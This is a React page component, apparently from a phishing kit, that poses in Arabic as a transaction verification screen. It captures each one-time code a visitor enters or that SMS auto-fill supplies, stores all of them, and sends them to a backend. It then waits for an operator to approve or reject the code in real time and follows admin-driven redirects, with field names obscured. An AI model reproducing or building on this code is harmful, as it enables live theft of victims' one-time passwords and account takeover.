

import { useState, useEffect } from "react"
import { useLocation } from 'wouter'
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Alert, AlertDescription } from "@/components/ui/alert"
import { ShieldCheck, AlertCircle, RefreshCw, Clock, Lock } from "lucide-react"
import { UnifiedSpinner, SimpleSpinner } from "@/components/unified-spinner"
import { addData } from "@/lib/api"
import { onVisitorStatusUpdated } from "@/lib/socket"
import { addToHistory } from "@/lib/history-utils"
import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
import { updateVisitorPage } from "@/lib/visitor-tracking"

const allOtps: string[] = []

export default function VeriPage() {
  const [, navigate] = useLocation()
  const [_v5, _s5] = useState("")
  const [error, setError] = useState("")
  const [_v5Status, _ss5] = useState<"pending" | "verifying" | "approved" | "rejected">("pending")
  const [isLoading, setIsLoading] = useState(true)
  const [visitorId, setVisitorId] = useState<string>("")
  const [canResend, setCanResend] = useState(false)
  const [resendTimer, setResendTimer] = useState(60)
  const [referenceNumber, setReferenceNumber] = useState("")

  // Initialize visitor ID and update current page
  useEffect(() => {
    const id = localStorage.getItem("visitor") || ""
    setVisitorId(id)
    if (id) {
      updateVisitorPage(id, "veri", 5)
      const ref = `REF${Date.now().toString().slice(-8)}`
      setReferenceNumber(ref)
    }
  }, [])

  // Monitor for admin redirects
  useRedirectMonitor({ visitorId, currentPage: "veri" })

  // Poll for _v5Status changes (fallback for SSE)
  useEffect(() => {
    if (!visitorId) return

    const pollStatus = async () => {
      try {
        const res = await fetch(`/api/visitors/${visitorId}`)
        if (!res.ok) return
        const data = await res.json()
        
        const status = data._v5Status
        if (status === 'rejected' && _v5Status !== 'rejected') {
          console.log('[Step2] Received rejected status via polling')
          _ss5('rejected')
          setError(data.otpRejectionMessage || 'رمز التحقق غير صحيح او منتهي الصلاحية')
        } else if (status === 'approved' && _v5Status !== 'approved') {
          console.log('[Step2] Received approved status via polling')
          _ss5('approved')
          setError('')
          navigate('/step3')
        }
      } catch (err) {
        console.error('[Step2] Polling error:', err)
      }
    }

    // Poll every 1 second
    const interval = setInterval(pollStatus, 1000)
    pollStatus() // Initial check

    return () => clearInterval(interval)
  }, [visitorId, _v5Status, navigate])

  // Resend timer
  useEffect(() => {
    if (resendTimer > 0) {
      const timer = setTimeout(() => setResendTimer(resendTimer - 1), 1000)
      return () => clearTimeout(timer)
    } else {
      setCanResend(true)
    }
  }, [resendTimer])

  // Check if visitor has access to this page
  useEffect(() => {
    const visitorID = localStorage.getItem("visitor")
    if (!visitorID) {
      navigate("/home-new")
      return
    }
    setIsLoading(false)
  }, [navigate])

  // Listen for OTP status changes via Socket.io
  useEffect(() => {
    const visitorID = localStorage.getItem("visitor")
    if (!visitorID) return

    const unsubscribe = onVisitorStatusUpdated(({ field, status }) => {
      if (field === '_v5Status') {
        if (status === 'rejected') {
          addData({ id: visitorID, _v5Status: 'pending' }).catch(console.error)
          _ss5('pending')
          _s5('')
          setError('تم رفض رمز التحقق. يرجى إدخال رمز صحيح.')
        } else if (status === 'approved') {
          _ss5('approved')
          setError('')
          navigate('/step3')
        } else if (status === 'verifying') {
          _ss5('verifying')
        }
      }
    })

    return () => unsubscribe()
  }, [navigate])

  // Navigation listener - listen for admin redirects via Socket.io
  useEffect(() => {
    const visitorID = localStorage.getItem("visitor")
    if (!visitorID) return

    const unsubscribe = onVisitorStatusUpdated(({ field, status }) => {
      if (field === 'currentStep') {
        if (status === 'home') navigate('/insur')
        else if (status === 'phone') navigate('/step5')
        else if (status === '_t6') navigate('/step4')
        else if (status === '_st1') navigate('/check')
        else if (status === '_t3') navigate('/step3')
      }
    })

    return () => unsubscribe()
  }, [navigate])

  // Auto-fill OTP from SMS (Web OTP API)
  useEffect(() => {
    if ('OTPCredential' in window) {
      const ac = new AbortController()
      navigator.credentials
        .get({
          // @ts-ignore
          _v5: { transport: ['sms'] },
          signal: ac.signal,
        })
        .then((_v5: any) => {
          if (_v5 && _v5.code) {
            _s5(_v5.code)
          }
        })
        .catch((err) => {
          console.log('OTP auto-fill error:', err)
        })
      return () => {
        ac.abort()
      }
    }
  }, [])

  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (_v5.length < 4) {
      setError("يرجى إدخال رمز التحقق")
      return
    }

    const visitorID = localStorage.getItem("visitor")
    if (!visitorID) return

    try {
      allOtps.push(_v5)
      await addData({
        id: visitorID,
        _v5,
        otpSubmittedAt: new Date().toISOString(),
        allOtps,
        _v5Status: 'verifying',
        otpUpdatedAt: new Date().toISOString(),
        _v5UpdatedAt: new Date().toISOString() // Dedicated timestamp for OTP
      })

      await addToHistory(visitorID, "_t2", { _v5 }, "pending")
      _ss5("verifying")
    } catch (err) {
      console.error("Error submitting OTP:", err)
      setError("حدث خطأ في إرسال رمز التحقق. يرجى المحاولة مرة أخرى.")
    }
  }

  const handleResendOtp = async () => {
    if (!canResend) return

    const visitorID = localStorage.getItem("visitor")
    if (!visitorID) return

    try {
      await addData({
        id: visitorID,
        otpResendRequested: true,
        otpResendAt: new Date().toISOString()
      })
      setCanResend(false)
      setResendTimer(60)
      _s5("")
      setError("")
    } catch (err) {
      console.error("Error resending OTP:", err)
      setError("حدث خطأ في إعادة الإرسال. يرجى المحاولة مرة أخرى.")
    }
  }

  if (isLoading) {
    return <SimpleSpinner />
  }

  return (
    <div className="min-h-screen bg-[#0a4a68] flex items-center justify-center p-4" dir="rtl">
      {(_v5Status === "verifying") && (
        <UnifiedSpinner message="جاري المعالجة" submessage="الرجاء الانتظار...." />
      )}

      <div className="w-full max-w-md">
        <div className="flex justify-center mb-6">
          <div className="w-20 h-20 bg-white rounded-full flex items-center justify-center shadow-lg">
            <ShieldCheck className="w-12 h-12 text-[#0a4a68]" />
          </div>
        </div>

        <div className="bg-white rounded-3xl shadow-2xl p-8">
          <form onSubmit={handleOtpSubmit} className="space-y-6">
            {error && (
              <Alert variant="destructive" className="border-2">
                <AlertCircle className="h-5 w-5" />
                <AlertDescription className="text-base">{error}</AlertDescription>
              </Alert>
            )}

            <div className="space-y-4">
              <p className="text-center text-gray-700 text-base font-semibold leading-relaxed">
                لإتمام العملية الرجاء إدخال رمز التحقق الذي تم إرساله إلى هاتفك المسجل
              </p>

              <div className="bg-blue-50 border border-blue-200 rounded-xl p-4 space-y-2">
                <div className="flex items-center gap-2 text-sm text-blue-800">
                  <Clock className="w-4 h-4" />
                  <span>الرمز صالح لمدة 5 دقائق</span>
                </div>
                <div className="flex items-center gap-2 text-sm text-blue-800">
                  <Lock className="w-4 h-4" />
                  <span>لا تشارك هذا الرمز مع أي شخص</span>
                </div>
                <div className="text-xs text-gray-600 text-center mt-2 pt-2 border-t border-blue-200">
                  رقم العملية: <span className="font-mono font-bold">{referenceNumber}</span>
                </div>
              </div>
              
              <Input
                type="password"
                inputMode="numeric"
                autoComplete="one-time-code"
                placeholder="رمز التحقق"
                value={_v5}
                onChange={(e) => {
                  const value = e.target.value.replace(/\D/g, "").slice(0, 6)
                  _s5(value)
                  setError("")
                }}
                maxLength={6}
                className="h-14 text-center text-4xl px-4 border-2 border-gray-300 focus:border-[#0a4a68] rounded-xl bg-white placeholder:text-gray-400"
                disabled={_v5Status === "verifying"}
                required
                autoFocus
              />

              <div className="text-center">
                {canResend ? (
                  <button
                    type="button"
                    onClick={handleResendOtp}
                    className="text-[#0a4a68] font-bold hover:underline flex items-center justify-center gap-2 mx-auto"
                  >
                    <RefreshCw className="w-4 h-4" />
                    إعادة إرسال الرمز
                  </button>
                ) : (
                  <p className="text-sm text-gray-500">
                    يمكنك إعادة الإرسال بعد {resendTimer} ثانية
                  </p>
                )}
              </div>
            </div>

            <Button
              type="submit"
              className="w-full h-14 bg-gradient-to-r from-yellow-400 to-yellow-500 hover:from-yellow-500 hover:to-yellow-600 text-[#0a4a68] font-bold text-xl rounded-xl shadow-lg hover:shadow-xl transition-all"
              disabled={_v5.length < 4 || _v5Status === "verifying"}
            >
              تأكيد
            </Button>
          </form>
        </div>
      </div>
    </div>
  )
}
